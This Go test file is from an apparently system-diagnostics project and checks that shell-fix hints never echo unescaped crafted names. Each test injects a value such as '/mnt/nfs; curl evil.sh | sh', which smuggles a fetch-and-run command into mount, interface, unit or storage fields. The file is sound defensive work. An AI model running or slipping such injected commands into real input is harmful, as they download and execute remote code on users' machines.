package analysis

import (
	"strings"
	"testing"

	"github.com/keyorixhq/dashdiag/internal/models"
)

// This file covers batch 2 of the shell-hint validation audit backlog
// (dashdiag-private/planning/TRIAGE-shell-hint-validation.md) — the
// high-confidence entries: checkNFS, checkNetwork's remaining WiFi/link-speed
// loops, checkPodmanQuadlets, checkCgroupV2/checkCgroupUnits,
// checkBtrfsVolume, checkPVEStorage. Same threat model as batch 1: each
// value is spliced unescaped into a copy-pasteable "to fix:"/"to inspect:"
// shell hint, so a crafted value containing shell metacharacters must never
// appear verbatim in one.

func TestCheckNFS_MountAndServerOmitShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeMount := "/mnt/nfs; curl evil.sh | sh"
	unsafeServer := "nfs.example.com; curl evil.sh | sh"
	got := checkNFS(models.NFSInfo{
		Mounts: []models.NFSMount{{
			Mount: unsafeMount, Server: unsafeServer, Stale: true,
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a stale NFS mount")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("NFS hint must not embed the raw shell-metacharacter mount/server verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckNFS_UnhealthyMountOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeMount := "/mnt/nfs; curl evil.sh | sh"
	unsafeServer := "nfs.example.com; curl evil.sh | sh"
	got := checkNFS(models.NFSInfo{
		Mounts: []models.NFSMount{{
			Mount: unsafeMount, Server: unsafeServer, Healthy: false,
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for an unhealthy NFS mount")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("NFS hint must not embed the raw shell-metacharacter mount/server verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckNetwork_WiFiInterfaceNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "wlan0; curl evil.sh | sh"
	got := checkNetwork(models.NetworkInfo{
		Interfaces: []models.InterfaceInfo{{
			Name: unsafe,
			WiFi: &models.WiFiInfo{SignalDBm: -85},
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for very weak WiFi signal")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("WiFi hint must not embed the raw shell-metacharacter interface name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckNetwork_LinkSpeedInterfaceNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "eth0; curl evil.sh | sh"
	got := checkNetwork(models.NetworkInfo{
		PrimaryInterface: unsafe,
		Interfaces: []models.InterfaceInfo{{
			Name: unsafe, SpeedMbps: 100,
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a slow-linked primary interface")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("link-speed hint must not embed the raw shell-metacharacter interface name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckPodmanQuadlets_ServiceUnitOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "myquadlet.service; curl evil.sh | sh"
	got := checkPodmanQuadlets(models.DockerInfo{
		PodmanQuadlets: []models.PodmanQuadlet{{
			Name: "myquadlet", ServiceUnit: unsafe, Failed: true, State: "failed",
		}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a failed quadlet")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("Podman quadlet hint must not embed the raw shell-metacharacter service unit verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckCgroupV2_SliceNameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "system.slice; curl evil.sh | sh"
	got := checkCgroupV2(models.CgroupV2Info{
		Available: true,
		Slices:    []models.CgroupSlice{{Name: unsafe, ThrottledPct: 95}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a heavily throttled slice")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("cgroup slice hint must not embed the raw shell-metacharacter slice name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckCgroupUnits_UnitAndContainerNameOmitShellMetachars(t *testing.T) {
	t.Parallel()
	unsafeParent := "system.slice; curl evil.sh | sh"
	unsafeUnit := "myapp.service; curl evil.sh | sh"
	unsafeContainer := "container:abc; curl evil.sh | sh"
	got := checkCgroupUnits([]models.CgroupUnit{
		{Name: unsafeUnit, ParentSlice: unsafeParent, ThrottledPct: 95},
		{Name: unsafeContainer, IsContainer: true, ThrottledPct: 95},
	})
	if len(got) != 2 {
		t.Fatalf("expected 2 insights (unit + container), got %d", len(got))
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("cgroup unit hint must not embed the raw shell-metacharacter unit/container name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckBtrfsVolume_MountPointOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "/mnt/btrfs; curl evil.sh | sh"
	got := checkBtrfsVolume(models.BtrfsVolume{
		MountPoint: unsafe, ShowRead: true, MissingDevs: 1,
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for a degraded btrfs volume")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("btrfs hint must not embed the raw shell-metacharacter mount point verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}

func TestCheckPVEStorage_NameOmitsShellMetachars(t *testing.T) {
	t.Parallel()
	unsafe := "local; curl evil.sh | sh"
	got := checkPVEStorage(models.PVEInfo{
		Storages: []models.PVEStorage{{Name: unsafe, Type: "dir", Enabled: true, Active: false}},
	})
	if len(got) == 0 {
		t.Fatal("expected at least one insight for an inactive PVE storage")
	}
	for _, ins := range got {
		for _, h := range ins.Hints {
			if strings.Contains(h, "curl evil.sh") {
				t.Errorf("PVE storage hint must not embed the raw shell-metacharacter storage name verbatim (copy-paste RCE risk): %q", h)
			}
		}
	}
}
